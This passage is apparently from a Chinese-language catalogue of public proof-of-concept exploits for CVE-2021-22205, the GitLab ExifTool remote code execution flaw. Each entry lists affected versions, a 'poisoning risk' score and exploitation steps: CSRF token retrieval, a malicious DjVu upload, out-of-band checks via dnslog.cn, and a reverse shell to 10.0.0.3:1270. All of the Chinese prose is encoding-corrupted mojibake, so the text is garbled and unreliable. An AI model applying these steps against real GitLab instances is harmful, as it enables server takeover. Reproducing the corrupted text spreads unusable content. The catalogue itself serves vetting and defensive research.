å¦‚æžœè¿™äº›åº“è¢«æ¶æ„ç¯¡æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŠ•æ¯’ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè„šæœ¬æœ¬èº«åŒ…å«ç›´æŽ¥çš„åŽé—¨ä»£ç çš„å¯èƒ½æ€§è¾ƒä½Žï¼Œä½†é—´æŽ¥æŠ•æ¯’é£Žé™©ï¼ˆå¦‚ä¾èµ–åº“æˆ–éªŒè¯å¹³å°è¢«æŽ§åˆ¶ï¼‰ä»ç„¶å­˜åœ¨ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©å¤§çº¦ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å– CSRF Tokenï¼š** è„šæœ¬é¦–å…ˆè®¿é—® `/users/sign_in` é¡µé¢ï¼Œä½¿ç”¨ `BeautifulSoup` è§£æž HTMLï¼Œæå– CSRF tokenã€‚
2.  **æž„é€ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DJVU æ ¼å¼å›¾åƒæ–‡ä»¶ã€‚è¯¥å‘½ä»¤é€šå¸¸ç”¨äºŽæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚é€šè¿‡ `curl` å°†æœåŠ¡å™¨ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„ DNS æœåŠ¡å™¨ã€‚
3.  **ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬ä½¿ç”¨åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶å’Œ CSRF token çš„ `multipart/form-data` è¯·æ±‚ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚
4.  **è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š** GitLab å°è¯•ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒï¼Œç”±äºŽæ–‡ä»¶å†…å®¹æ²¡æœ‰ç»è¿‡å……åˆ†éªŒè¯ï¼Œå¯¼è‡´ ExifTool æ‰§è¡ŒåµŒå…¥åœ¨å›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ã€‚
5.  **éªŒè¯æ¼æ´žï¼š** è„šæœ¬é€šè¿‡æŸ¥è¯¢ `dnslog.cn` æ¥ç¡®è®¤å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥æ¼æ´žåˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä½†éœ€è¦æ³¨æ„æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [hhhotdrink/CVE-2021-22205](https://github.com/hhhotdrink/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #14

**æ¥æº**: [CVE-2021-22205-honypot_CVE-2021-22205.md](../2021/CVE-2021-22205-honypot_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æœªç»èº«ä»½éªŒè¯çš„ç½‘ç»œè®¿é—®ï¼Œä»¥åŠç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 20%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨Docker Composeéƒ¨ç½²äº†ä¸€ä¸ªåŒ…å«æ¼æ´žçš„GitLab EE 13.9.5å®žä¾‹ï¼Œè¡¨æ˜Žè¯¥POCæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥å¤çŽ°è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
å°½ç®¡å¤§éƒ¨åˆ†ä»£ç çœ‹èµ·æ¥æ˜¯ä¸ºäº†å¤çŽ°æ¼æ´žï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚
*   `gitlab/entry.sh`è„šæœ¬æ·»åŠ äº†ä¸€ä¸ªåä¸º`eth1`çš„è™šæ‹Ÿç½‘ç»œæŽ¥å£ï¼Œå¹¶åˆ†é…äº†ä¸€ä¸ªå…¬ç½‘IPåœ°å€ã€‚è¿™æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶äº†GitLabå®žä¾‹ï¼Œåˆ™å¯èƒ½åˆ©ç”¨æ­¤æŽ¥å£è¿›è¡Œéšè”½é€šä¿¡æˆ–æ•°æ®æ³„éœ²ã€‚å¯èƒ½æ€§ä¸º10%ã€‚
* `gitlab/dummy/backup.txt`åŒ…å«äº†ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·åå¯†ç ,å¦‚æžœè¢«åˆ©ç”¨,å­˜åœ¨å®‰å…¨é£Žé™©ã€‚å¯èƒ½æ€§ä¸º10%.

æ€»ä½“çš„æŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º20%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…éœ€è¦æž„å»ºä¸€ä¸ªæ¶æ„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥çš„ExifToolå‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…å°†æ¶æ„å›¾åƒä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„GitLabå®žä¾‹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®é™„ä»¶ç­‰ï¼‰ã€‚
3.  GitLabå°è¯•å¤„ç†å›¾åƒï¼Œè°ƒç”¨ExifToolã€‚
4.  ExifToolæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [honypot/CVE-2021-22205](https://github.com/honypot/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #15

**æ¥æº**: [CVE-2021-22205-inspiringz_CVE-2021-22205.md](../2021/CVE-2021-22205-inspiringz_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼ŒæœªæŽˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œå¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabæœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ExifToolå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žå½±å“å¤šä¸ªGitLabç‰ˆæœ¬ï¼Œä¸”CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ã€‚æ¼æ´žåˆ©ç”¨ä»£ç æ—¨åœ¨åˆ©ç”¨ExifToolåœ¨å¤„ç†æ¶æ„å›¾åƒæ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆ©ç”¨CVE-2021-22205æ¼æ´žçš„exploitï¼Œç”¨äºŽè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…¶ä¸­å®šä¹‰äº†Sessionsç±»ä»¥æ–¹ä¾¿å‘é€HTTPè¯·æ±‚, å¹¶ä¸”ä½¿ç”¨äº†DNSLogï¼ŒPostBinï¼ŒRequestBinç­‰æœåŠ¡ä½œä¸ºéªŒè¯æ¼æ´žçš„æ–¹å¼ã€‚ä»£ç ä¸­`random_str`å‡½æ•°ç”¨äºŽç”Ÿæˆéšæœºå­—ç¬¦ä¸²ï¼Œè¿™åœ¨æ¼æ´žåˆ©ç”¨ä¸­å¾ˆå¸¸è§ï¼Œç”¨äºŽé¿å…è¢«ç®€å•è§„åˆ™æ£€æµ‹ã€‚`/tmp/5c52ea306e0854cb73063a671293313c/CVE-2021-22205.py`è¡¨æ˜Žè¯¥è„šæœ¬ä½äºŽä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œå¯èƒ½è¡¨æ˜Žæ˜¯ä¸€ä¸ªæå–å‡ºæ¥çš„æˆ–è€…ä¸‹è½½çš„åˆ©ç”¨è„šæœ¬ã€‚ä»£ç ä¸­å­˜åœ¨å¯¹ä¸€äº›å¤–éƒ¨æœåŠ¡çš„è°ƒç”¨ï¼Œæ¯”å¦‚DNSLogï¼ŒRequestBinç­‰ï¼Œä½œè€…å¯èƒ½é€šè¿‡è¿™äº›æœåŠ¡æ¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šè¢«æŠ•æ¯’çš„é£Žé™©ï¼Œä¾‹å¦‚ä½œè€…åœ¨è„šæœ¬ä¸­åµŒå…¥æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ç›®æ ‡æœåŠ¡å™¨çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿æˆ–è€…å…¶ä»–æ¶æ„è¡Œä¸ºã€‚æ­¤å¤–ï¼ŒDNSLogå¦‚æžœè¢«æ¶æ„åŠ«æŒï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œå­˜åœ¨10%çš„æŠ•æ¯’å¯èƒ½æ€§ï¼Œè¯·ä»”ç»†å®¡è®¡ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å–CSRF Tokenå’ŒSession Cookieï¼š** æ¼æ´žåˆ©ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯èŽ·å–æœ‰æ•ˆçš„CSRF Tokenå’ŒSession Cookieã€‚POCä»£ç é¦–å…ˆå°è¯•è®¿é—® `/users/sign_in`ã€`/help` æˆ– `/explore` é¡µé¢ï¼Œç„¶åŽä»Žä¸­æå–æ‰€éœ€çš„tokenå’Œcookieã€‚
2.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** åˆ©ç”¨èŽ·å–çš„CSRF Tokenå’ŒSession Cookieï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶çš„Exifå…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šç”±ExifToolæ‰§è¡Œã€‚
3.  **è¿œç¨‹ä»£ç æ‰§è¡Œï¼š** å½“GitLabæœåŠ¡å™¨å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šæ‰§è¡Œå›¾åƒå…ƒæ•°æ®ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  **OOBï¼ˆå¸¦å¤–ï¼‰éªŒè¯ï¼š**  POCä»£ç åˆå§‹åŒ–äº†DNSLogï¼ŒRequestBinç­‰æœåŠ¡ï¼Œç”¨äºŽéªŒè¯æ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡DNSæŸ¥è¯¢æˆ–è€…HTTPè¯·æ±‚çš„æ–¹å¼æ¥ç¡®å®šå‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #16

**æ¥æº**: [CVE-2021-22205-keven1z_CVE-2021-22205.md](../2021/CVE-2021-22205-keven1z_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯å¯¼è‡´å®Œå…¨ç³»ç»ŸæŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå½±å“ GitLab CE/EE çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žå­˜åœ¨äºŽå›¾åƒæ–‡ä»¶è§£æžè¿‡ç¨‹ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„ DJVU å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POC ä»£ç ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£Žé™©ã€‚é£Žé™©ä¸º10%ã€‚

ä»¥ä¸‹æ˜¯å¯¹ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’é£Žé™©ç‚¹çš„åˆ†æžï¼š

*   **ç¡¬ç¼–ç çš„User-Agent:**  POC ä½¿ç”¨äº† `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36`ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›ç®€å•çš„ WAF è§„åˆ™ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æŒ‡çº¹è¯†åˆ«ï¼Œä»Žè€Œä½¿æ”»å‡»æ›´å®¹æ˜“è¢«æ£€æµ‹ã€‚è™½ç„¶ä¸ç®—æ¶æ„ï¼Œä½†ä¸å¤Ÿçµæ´»ï¼Œå¯èƒ½å½±å“åˆ©ç”¨æ•ˆæžœã€‚
*   **Payloadå®šæ­»ï¼Œç¼ºå°‘éšæœºæ€§ï¼š**POCä¸­ç”¨äºŽè§¦å‘æ¼æ´žçš„DJVUæ–‡ä»¶å†…å®¹ç›¸å¯¹å›ºå®šã€‚è™½ç„¶ä¿®æ”¹äº†commandéƒ¨åˆ†,ä½†æ˜¯å¦‚æžœç›®æ ‡ç³»ç»Ÿå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿™ç§å›ºå®šçš„Payloadå¯èƒ½ä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å¦‚æžœpayloadåŠ å…¥éšæœºåŒ–,å¯¹æ”»å‡»æ›´åŠ æœ‰åˆ©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆå‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `/users/sign_in` èŽ·å– CSRF tokenã€‚è¯¥tokenç”¨äºŽåŽç»­çš„postè¯·æ±‚çš„è®¤è¯ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶åœ¨ metadata å­—æ®µä¸­åµŒå…¥æ¶æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…æž„é€ ä¸€ä¸ª multipart/form-data è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` è·¯å¾„ã€‚
4.  å½“ GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼ŒExifTool ä¼šè¢«è°ƒç”¨æ¥æå–å›¾åƒå…ƒæ•°æ®ã€‚ç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼ŒExifTool ä¼šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  åˆ©ç”¨ä»£ç ä¸­ï¼Œcommandå˜é‡å¯ä»¥å®šä¹‰åå¼¹shellæˆ–è€…æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [keven1z/CVE-2021-22205](https://github.com/keven1z/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #17

**æ¥æº**: [CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md](../2021/CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** å¯ä»Žç½‘ç»œè®¿é—®å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ï¼Œä¸”å®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚æ¼æ´žåŽŸå› æ˜¯ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒDjVuæ–‡ä»¶ï¼‰åˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸¤ä¸ªä¸»è¦æ­¥éª¤ï¼š
1.  **ç”ŸæˆPayloadï¼š**  PoC é¦–å…ˆç”Ÿæˆä¸€ä¸ªåä¸º lol.jpg çš„ DjVu å›¾åƒï¼Œè¯¥å›¾åƒåŒ…å«ä¸€ä¸ªåå‘ shell çš„ Payloadã€‚è¯¥Payloadä½¿ç”¨ `base64` ç¼–ç å¹¶æ‹¼æŽ¥shellå‘½ä»¤åˆ°æ–‡ä»¶æœ«å°¾. Payloadå»ºç«‹ä¸Ž `10.0.0.3` ç«¯å£ `1270` çš„åå‘è¿žæŽ¥ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚
2.  **å‘é€Payloadï¼š**  PoC ä½¿ç”¨ `curl` å‘½ä»¤å°†ç”Ÿæˆçš„ lol.jpg æ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°å°†æ–‡ä»¶ä½œä¸º POST è¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€ã€‚`http://10.0.0.7/$(openssl rand -hex 8)` è¡¨ç¤ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»»æ„ endpoint è§¦å‘è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
é€šè¿‡åˆ†æžPoCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ã€‚è¯¥ä»£ç æ—¨åœ¨ç”Ÿæˆå¹¶ä¸Šä¼ ä¸€ä¸ªåŒ…å«åå‘ shell çš„å›¾åƒæ–‡ä»¶ã€‚æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´žï¼Œå¹¶æ²¡æœ‰æ·»åŠ ä»»ä½•ä¸Žæ¼æ´žåˆ©ç”¨æ— å…³çš„æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
1.  æ”»å‡»è€…æž„é€ æ¶æ„çš„DjVuå›¾åƒï¼Œè¯¥å›¾åƒåµŒå…¥äº†å‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…é€šè¿‡ä¸Šä¼ åŠŸèƒ½ï¼Œå°†æž„é€ çš„å›¾åƒä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸ä¼šé˜»æ­¢æ¶æ„å›¾åƒã€‚
3.  GitLabåœ¨å¤„ç†å›¾åƒæ—¶ï¼Œè°ƒç”¨ExifToolç­‰å›¾åƒå¤„ç†å·¥å…·ã€‚
4.  ExifToolè§£æžæ¶æ„å›¾åƒï¼Œæ‰§è¡Œå…¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…é€šè¿‡åå‘shellèŽ·å–å¯¹GitLabæœåŠ¡å™¨çš„è®¿é—®æƒé™ï¼Œä»Žè€Œå®žçŽ°å¯¹ç³»ç»Ÿçš„æŽ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-](https://github.com/momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #18

**æ¥æº**: [CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žå­˜åœ¨äºŽGitLabä¸­ï¼Œç”±äºŽExifToolåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶æœªæ­£ç¡®éªŒè¯ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶è§¦å‘æ¼æ´žã€‚å…·ä½“æ¥è¯´ï¼ŒGitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè€ŒExifToolåœ¨å¤„ç†DjVuæ ¼å¼æ–‡ä»¶æ—¶ï¼Œå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´žã€‚æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ä»£ç çš„DjVuæ–‡ä»¶ï¼Œå°†å…¶ä¸Šä¼ è‡³GitLabï¼Œå½“GitLabå°è¯•è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
